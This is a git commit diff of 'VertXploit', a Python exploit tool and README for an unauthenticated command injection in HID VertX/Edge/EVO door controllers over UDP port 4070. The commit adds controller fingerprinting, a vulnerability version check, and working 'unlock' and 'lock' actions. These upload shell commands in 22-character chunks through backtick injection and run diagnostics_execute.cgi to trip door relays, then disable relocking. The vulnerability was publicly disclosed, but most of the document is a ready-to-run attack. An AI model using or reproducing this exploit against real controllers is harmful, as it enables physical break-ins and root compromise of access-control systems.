78123c9d27901f34180c1c202c5cba876f45bb0c
root <coldfusion_39@hotmail.com>
2016-08-20 16:52:42 -0400

    Added the ability to unlock and lock doors, updated README

--- README.md
+++ README.md
@@ -1,14 +1,14 @@
 # VertXploit
-HID VertX/Edge Command Injection
+Command Injection on HID VertX and Edge Door Controllers
 
 ## Summary ##
 Originally disclosed by Ricky "HeadlessZeke" Lawshae of Trend Micro DVLabs
 
-This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of HID Edge. Authentication is not required to exploit this vulnerability.
+This vulnerability allows remote attackers to execute arbitrary code on VertX, Edge, and EVO HID access control panels. Authentication is not required to exploit this vulnerability.
 
 The specific flaw exists within the discoveryd service. The issue lies in the failure to sanitize user data before executing a system call. An attacker could leverage this vulnerability to execute code with root privileges.
 
-The actual location of the command injection is in the `command_blink_on` command. Normally, the command would end with the number of times the VertX/Edge controller light should blink, in this case 30 times. 
+The actual location of the command injection is in the `command_blink_on` command. Normally, the command string would terminate with the number of times the VertX controller light should blink, in this case 30 times. 
 
 `command_blink_on;042;<MAC_ADDRESS>;30;`
 
@@ -17,15 +17,59 @@ By replacing the number of blinks with a Linux command and wrapping it in back t
 ``command_blink_on;042;<MAC_ADDRESS>;`ping -c 5 192.168.0.39`;``
 
 ## Usage ##
-The only requirement is the IP address of an un-patched HID VertX/Edge door controller. The device itself uses UDP port 4070 by default. Depending on what payload is being sent, the VertX/Edge system may not be able to execute the command because it is not installed (ie Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX/Edge models tested.
+The only requirement is the IP address of an un-patched HID VertX door controller. The device itself uses UDP port 4070 by default.
 
-## Example ##
+Running the script without specifying a raw payload, `--raw`, or action, `--action`, will attempt to fingerprint the VertX controller and return version information.
+
+To remotely unlock and lock doors connected to the VertX controller commands are echoed to `/tmp/a`. This is done because there is a length limit of how many characters can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>
+
+Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`. The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` for sending the unlock and lock the commands to the VertX controller
+
+### Unlock ###
+	# Set QUERY_STRING to the door unlock value
+	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=1"
+
+	# Run 'diagnostics_execute.cgi' script
+	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi
+
+	# Remove executable permissions to prevent the door from locking
+	chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi
+
+### Lock ###
+	# Enable executable permissions
+	chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi
+
+	# Set QUERY_STRING to the door lock value
+	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=0"
+
+	# Run 'diagnostics_execute.cgi' script
+	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi
+
+### Raw Payload ###
+Depending on what payload is being sent, the VertX system may not be able to execute the command because it is not installed (i.e. Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX models tested.
+
+
+## Examples ##
+
+###### Fingerprint a VertX controller
+
+`python vertXploit.py -i 192.168.0.5`
+
+###### Unlock doors connected to the VertX controller
+
+`python vertXploit.py -i 192.168.0.5 --action unlock`
+
+###### Lock doors connected to the VertX controller
+
+`python vertXploit.py -i 192.168.0.5 --action lock`
+
 ###### Execute the command 'ping -c 5 192.168.0.39'
 
 `python vertXploit.py -i 192.168.0.5 ping -c 5 192.168.0.39`
 
+
 ## Resources ##
+* HeadlessZeke - https://github.com/headlesszeke/defcon24-demos
 * TrendMicro Blog - http://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/
 * ZDI - http://www.zerodayinitiative.com/advisories/ZDI-16-223/
 * Other Work - http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html
-
--- vertXploit.py
+++ vertXploit.py
@@ -19,59 +19,150 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 import argparse
+import time
 from socket import *
 
 def main():
-	parser = argparse.ArgumentParser(description='HID VertX controller command injection')
+	parser = argparse.ArgumentParser(description='Command Injection on HID VertX and Edge Door Controllers')
 	parser.add_argument('-i', '--ip', help='IP address of VertX controller, (default 255.255.255.255)', default='255.255.255.255', required=False)
 	parser.add_argument('-p', '--port', help='Port of VertX controller, (default 4070)', default=4070, type=int, required=False)
-	parser.add_argument('payload', help='Linux command payload (hint: ping -c 5 IP_ADDRESS)', action='store_true')
-	parsed, args = parser.parse_known_args()
-
-	payload = ' '.join(args)
+	parser.add_argument('--action', help='Unlock or lock or doors', choices=['unlock', 'lock'], default=None, required=False)
+	parser.add_argument('--raw', help='Raw Linux command as payload (hint: ping -c 5 IP_ADDRESS)', action='store_true', required=False)
+	args = parser.parse_args()
 
 	s = socket(AF_INET, SOCK_DGRAM)
 	s.settimeout(5)
-	if parsed.ip == '255.255.255.255':
+	if args.ip == '255.255.255.255':
 		s.bind(('', 0))
 		s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
 
+	# Send discovery request
+	response_data = send_command(s, 'discover;013;', '', args.ip, args.port)
+	if response_data:
+		mac_address, board = fingerprint_controller(response_data)
+
+		# Send raw Linux command line payload
+		if args.raw:
+			payload = "{0};1`{1}`;".format(mac_address, ' '.join(args.raw))
+			send_command(s, 'command_blink_on;', payload, args.ip, args.port)
+
+		# Unlock doors
+		elif args.action == 'unlock':
+			commands = ["export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(board),
+				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
+				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
+			]
+
+			print_status('Unlocking doors...')
+			upload_script(s, commands, mac_address, args.ip, args.port)
+
+		# Lock doors
+		elif args.action == 'lock':
+			commands = ['chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
+				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(board),
+				"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
+			]
+
+			print_status('Locking doors...')
+			upload_script(s, commands, mac_address, args.ip, args.port)
+
+	s.close()			
+
+# Get information about VertX controller
+def fingerprint_controller(data):
+	response_data = data[0].split(';')
+	print_good("VertX Controller Information")
+	print "RAW (ASCII): {0}".format(data)
+	print "Name: {0}".format(response_data[3])
+	print "Model: {0}".format(response_data[6])
+	print "Version: {0} - ({1})".format(response_data[7], response_data[8])
+	print "IP Address: {0}".format(response_data[4])
+	print "MAC Address: {0}".format(response_data[2])
+	print "Vulnerable: {0}\n".format(check_version(response_data[7]))
+
+	return response_data[2], response_data[6]
+
+# Check of VertX/Edge controller is vulnerable
+def check_version(version):
+	vulnerable = False
+
+	# Legacy VertX/Edge controllers patched with 2.2.7.568
+	if int(version[0]) == 2 and int(version.replace('.', '')) < 227568:
+		vulnerable = True
+
+	# EVO VertX/Edge controllers patched with 3.5.1.1483
+	elif int(version[0]) == 3 and int(version.replace('.', '')) < 3511483:
+		vulnerable = True
+
+	else:
+		vulnerable = None
+
+	return vulnerable
+
+# Upload script
+def upload_script(s, commands, mac, ip, port):
+	command = 'command_blink_on;'
+
+	payload_chunks = list(chunk_string('!'.join(commands), 22))
+	for payload_chunk in payload_chunks:
+		payload = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, payload_chunk)
+		send_command(s, command, payload, ip, port)
+
+	time.sleep(1)
+
+	# Remove newlines
+	payload = "{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+	# Replace intended newlines
+	payload = "{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+	# Make script executable
+	payload = "{0};1`chmod +x /tmp/a`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+	# Execute uploaded script
+	payload = "{0};1`/tmp/a`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+	print_status('Sleeping for 10 seconds before cleaning up...')
+	time.sleep(10)
+
+	# Remove uploaded scripts
+	payload = "{0};1`rm /tmp/a`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+	payload = "{0};1`rm /tmp/b`;".format(mac)
+	send_command(s, command, payload, ip, port)
+
+# Trigger command injection
+def send_command(s, command, payload, ip, port):
+	if len(payload) == 0:
+		print_status("Sending discovery request to {0}...".format(ip))
+		command_buffer = command
+	else:
+		print_status("Sending payload: ({0}) to {1}...".format((payload.rstrip()).replace('\n', '\\n'), ip))
+		command_buffer = "{0}{1};{2}".format(command, str(len(command) + len(payload) + 4).zfill(3), payload)
+
+	s.sendto(command_buffer, (ip, port))
+
+	# Parse response
 	try:
-		# Get information about VertX controller
-		print_status("Getting MAC address of {0}...\n".format(parsed.ip))
-		s.sendto('discover;013;', (parsed.ip, parsed.port))
-		discovery_response = s.recvfrom(1024)
-		if discovery_response:
-			data = discovery_response[0].split(';')
-			print_good("VertX Controller Information")
-			print "RAW (ASCII): {0}".format(discovery_response)
-			print "Name: {0}".format(data[3])
-			print "Model: {0}".format(data[6])
-			print "Version: {0} - ({1})".format(data[7], data[8])
-			print "IP Address: {0}".format(data[4])
-			print "MAC Address: {0}\n".format(data[2])
-
-			# Trigger command injection
-			mac_address = data[2]
-			if mac_address:
-				full_payload = "command_blink_on;042;{0};`{1}`;".format(mac_address, payload)
-				print_status("Sending payload: ({0}) to {1}...".format(payload, parsed.ip))
-				s.sendto(full_payload, (parsed.ip, parsed.port))
-
-				# Parse response
-				payload_response = s.recvfrom(1024)
-				if payload_response:
-					if payload_response[0].split(';')[0] == 'ack':
-						print_good('Command sent successfully')
-				else:
-					print_warn('VertX controller did not send a response!')
+		payload_response = None
+		payload_response = s.recvfrom(1024)
+		if len(payload) == 0:
+			return payload_response
 		else:
-			print_warn('Device might not be a VertX controller!')
+			if payload_response[0].split(';')[0] == 'ack':
+				print_good('Command sent successfully')
 
-	except Exception as error:
-		print_error("Error: {0}".format(error))
+	except Exception, error:
+		print_error('VertX controller did not send a response!')
 
-	s.close()
+# Split command because of 22 character length limit
+def chunk_string(command, length):
+	return (command[0 + i:length + i] for i in range(0, len(command), length))
 
 def print_error(msg):
 	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
